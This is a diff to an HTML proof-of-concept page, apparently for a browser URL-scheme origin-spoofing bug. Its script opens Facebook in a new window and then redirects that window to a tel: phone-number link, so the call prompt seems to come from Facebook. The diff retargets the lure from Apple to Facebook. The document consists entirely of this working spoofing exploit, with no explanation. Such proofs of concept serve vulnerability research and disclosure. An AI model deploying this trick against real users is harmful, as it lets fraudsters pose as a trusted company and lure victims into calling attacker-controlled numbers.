@@ -5,15 +5,15 @@
         <title>URL Scheme Reference Origin Spoof</title>
     </head>
     <body>
-        <u><a id="contact" onclick="contactSite()">Contact Apple</a></u>
+        <u><a id="contact" onclick="contactSite()">Contact Facebook</a></u>
         <script type="text/javascript">
             function contactSite() {
-                var x = window.open("https://www.facebook.com/help/search/?q=contact%20facebook");
+                var x = window.open("https://www.facebook.com/");
                 setTimeout(function() {
                     x.location.href = "tel:+123456789";
                 }, 1500);
                 setTimeout(function() {
-                    location.href = "https://www.facebook.com/help/search/?q=contact%20facebook";
+                    location.href = "https://www.facebook.com/";
                 }, 1500);
             }
         </script>
